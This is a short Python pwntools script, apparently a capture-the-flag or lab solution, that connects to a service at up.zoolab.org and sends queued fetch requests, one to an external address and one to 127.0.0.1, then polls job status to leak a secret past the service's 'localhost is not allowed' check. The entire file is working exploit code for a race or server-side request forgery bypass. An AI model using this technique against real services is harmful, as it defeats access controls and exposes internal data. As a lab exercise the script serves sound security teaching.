from pwn import remote, log
import re, time

HOST = 'up.zoolab.org'
PORT = 10932

BAD_KEYWORDS = [
    b'Incorrect server input!',
    b'Resolve failed.',
    b'Get from localhost is not allowed!',
    b'Get from * is not allowed!',
    b'Connecting to',
    b'Connection refused',
]

def main():
    conn = remote(HOST, PORT)
    conn.recvuntil(b'What do you want to do? ')
    payload = b'g\n140.113.240.82/10000\ng\n127.0.0.1/1\n'
    conn.send(payload)
    time.sleep(0.2)

    for _ in range(100):
        conn.sendline(b'v')
        try:
            data = conn.recvuntil(b'What do you want to do? ', timeout=1)
        except EOFError:
            break

        for line in data.splitlines():
            if not line.startswith(b'Job #'):
                continue
            m = re.match(br'Job #\d+: \[(.*?)\] (.*)', line)
            if not m:
                continue
            addr_port, status = m.groups()
            if addr_port == b'127.0.0.1/1':
                continue
            if any(kw in status for kw in BAD_KEYWORDS):
                continue
            secret = status.decode()
            print(secret)
            conn.close()
            return

        time.sleep(0.1)

    log.error('Timeout: secret not found')
    conn.close()

if __name__ == '__main__':
    main()
